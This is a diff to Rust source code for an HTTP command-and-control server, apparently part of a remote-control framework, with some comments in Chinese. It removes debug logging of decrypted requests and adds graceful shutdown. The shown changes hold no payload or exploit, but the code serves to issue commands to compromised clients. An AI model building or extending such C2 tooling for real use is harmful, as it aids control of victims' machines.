@@ -92,9 +92,6 @@ async fn handle_c2(
     headers: axum::http::HeaderMap,
     body: axum::body::Bytes,
 ) -> impl IntoResponse {
-    // Debug: print raw body
-    println!("[DEBUG] Received body ({} bytes): {}", body.len(), 
-             String::from_utf8_lossy(&body[..std::cmp::min(500, body.len())]));
     
     // Parse JSON manually
     let encrypted_req: EncryptedRequest = match serde_json::from_slice(&body) {
@@ -136,9 +133,6 @@ async fn handle_c2(
             return (StatusCode::UNAUTHORIZED, Json(serde_json::json!({ "error": "Decryption failed" })));
         }
     };
-    
-    // Debug: print decrypted content
-    println!("[DEBUG] Decrypted content: {}", String::from_utf8_lossy(&decrypted));
     
     // 解析请求
     let request: C2Request = match serde_json::from_slice(&decrypted) {
@@ -631,15 +625,27 @@ pub fn send_to_client(state: &SharedState, client_id: &str, data: &[u8]) {
     state.push_command(client_id, data.to_vec());
 }
 
-/// 启动 HTTP 服务器
-pub async fn start_server(state: SharedState, bind_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+/// 启动 HTTP 服务器（带优雅关闭支持）
+pub async fn start_server(
+    state: SharedState, 
+    bind_addr: &str,
+    mut shutdown_rx: tokio::sync::oneshot::Receiver<()>,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let app = create_router(state);
     let addr: SocketAddr = bind_addr.parse()?;
     
     println!("[*] Starting HTTP C2 server on {}", addr);
     
     let listener = tokio::net::TcpListener::bind(addr).await?;
-    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await?;
     
+    // 使用 axum 的 graceful shutdown
+    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
+        .with_graceful_shutdown(async move {
+            let _ = shutdown_rx.await;
+            println!("[*] HTTP C2 server shutting down...");
+        })
+        .await?;
+    
+    println!("[*] HTTP C2 server stopped");
     Ok(())
 }
